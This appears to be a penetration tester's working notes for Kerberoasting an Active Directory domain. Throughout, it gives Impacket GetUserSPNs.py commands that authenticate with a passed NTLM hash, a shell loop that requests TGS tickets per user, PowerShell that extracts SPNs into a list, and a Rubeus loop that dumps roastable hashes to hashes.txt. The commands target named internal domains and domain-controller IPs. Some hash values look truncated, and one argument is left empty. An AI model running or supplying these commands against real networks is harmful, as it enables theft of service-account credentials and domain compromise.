Request for tgs
```
 for i in $(cat kerb_n.txt); do python3 GetUserSPNs.py -target-domain  -request-user $i -outputfile hashes_$i.txt -hashes AAD3B435B51404EEAAD3B435B51404EE:2d6ae0b7ddfc2cac9477fe8554 -dc-ip 10.1.1.17 | tee -a hashes.txt; done

```


Get spn info
```
python3 GetUserSPNs.py -target-domain n.ad.testinternal.com -request -outputfile kerb_n.txt -hashes AAD3B435B51404EEAAD3B435B51404EE:2d6ae0b7ddfc2cac9477f8554 -dc-ip 10.1.1.6 test-globalx.com/bhous
```


sort spns into a column in txt

```
# Read the content of the text file into a variable
$contents = Get-Content -Path "yourfile.txt"

# Initialize an array to store the extracted service principal nes
$extractedSPNs = @()

# Iterate through each line in the file
foreach ($line in $contents) {
    # Split the line into columns based on space (assuming space is the delimiter)
    $columns = $line -split ' '
    
    # Check if there is a first column (containing the SPN)
    if ($columns.Count -ge 1) {
        $extractedSPNs += $columns[0]
    }
}

# Create a new column with the extracted SPNs
$extractedSPNs | ForEach-Object { [PSCustomObject]@{ "SPNColumn" = $_ } }

# Display the result
$extractedSPNs > UserWithSPNs.txt

```


send tgs request reading through list from above
```
# Define the path to your SPN file
$spnFilePath = 'C:\Users\Tester\Desktop\test\ColumnOfSPNs.txt'

# Read each line (SPN) from the file
$spns = Get-Content $spnFilePath

# Loop through each SPN
foreach ($spn in $spns) {
    # Print the current SPN being processed
    Write-Verbose "Processing SPN: $spn" -Verbose

    # Run Rubeus kerberoast for each SPN and append the output to hashes.txt
    Rubeus.exe kerberoast /spn:"$spn" | Out-File -Append hashes.txt

    # Optionally, you can add more verbose output here if needed
}

```